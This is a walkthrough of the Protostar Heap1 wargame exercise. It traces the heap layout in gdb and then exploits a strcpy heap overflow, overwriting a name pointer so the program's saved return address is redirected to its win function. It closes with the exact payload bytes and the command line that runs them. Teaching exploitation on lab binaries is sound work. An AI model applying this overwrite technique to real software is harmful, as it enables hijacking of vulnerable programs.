# For Heap1 in Protostar

The source code given by [Heap1](https://exploit-exercises.com/protostar/heap1/) is a big clue. It tells us that there are 2 arguments needed to run the program.
### First test
I ran the program in gdb to see how the heap changes as the program runs.
argv[1]: `aaabbb`
argv[2]: `cccddd`
```
(gdb) start
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) set args "aaabbb" "cccddd"
(gdb) r
```

After `i1 = malloc(sizeof(struct internet));`, `i1` is allocated space from `0x804a008` to `0x804a010`. 
```
(gdb) x/32x 0x8049ff8
0x8049ff8:  0x00000000  0x00000000  0x00000000  0x00000011
0x804a008:	0x00000000	0x00000000	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```

After `i1->priority = 1;`
```
(gdb) x/32x 0x804a008
0x804a008:	0x00000001	0x00000000	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```

After `i1->name = malloc(8);`, `i1->name` is allocaed space from `0x804a018` to `0x804a020`
```
(gdb) x/32x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x00000000	0x00000000	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```
After `i2 = malloc(sizeof(struct internet));` & `i2->priority = 2;`. `i2` is allocated space from `0x804a028` to `0x804a030`.
```
(gdb) x/32x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x00000000	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```

After `i2->name = malloc(8);`, `i2->name` is allocated space from `0x804a038` to `0x804a040`
```
(gdb) x/32x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```

After `strcpy(i1->name, argv[1]);`. `strcpy` copies `argv[1]` to the address stored in memory address `0x804a00c`.
```
(gdb) x/32x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x62616161	0x00006262	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```

After `strcpy(i2->name, argv[2]);`. `strcpy` copies `argv[2]` to the address stored in memory address `0x804a02c`.
```
(gdb) x/32x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x62616161	0x00006262	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x64636363	0x00006464	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```


### Vulnerability and exploit
The moment I saw `strcpy` copying user input to a part of memory, I knew buffer overflow was involved. So how exactly are we going to use it to our benefit? After a moment of thinking, I decided to try out this tactic:
1. Using `argv[1]`, I shall override the value of `i2->name` to `0xbffff69c`, where the return address from `<main>` is stored.
2. Then I shall use `argv[2]` to input the address of `<win`>, `0x08048494`.

Fortunately, no `free` is involved, so I need not care about corrupting the heap metadata.
##### Checking ret value from <main>
Before `ret` from `<main>`
```
(gdb) p/x $ebp
$5 = 0xbffff698
(gdb) p/x $esp
$6 = 0xbffff670
(gdb) x/4x 0xbffff698
0xbffff698:	0xbffff718	0xb7eadc76	0x00000003	0xbffff744
```
After `ret` from the `<main>` 
```
(gdb) p/x $eip
$7 = 0xb7eadc76
```
The outut above confirms that our return address is ineed stored in address `0xbffff69c`.

##### My input
argv[1]: `\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x9c\xf6\xff\xbf`
argv[2]: `\x94\x84\x04\x08`

##### And we have a winner!
```
user@protostar:/opt/protostar/bin$ echo -e "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x9c\xf6\xff\xbf" "\x94\x84\x04\x08" | xargs -n 2 ./heap1
and we have a winner @ 1522381306
xargs: ./heap1: terminated by signal 4
user@protostar:/opt/protostar/bin$ 
```

END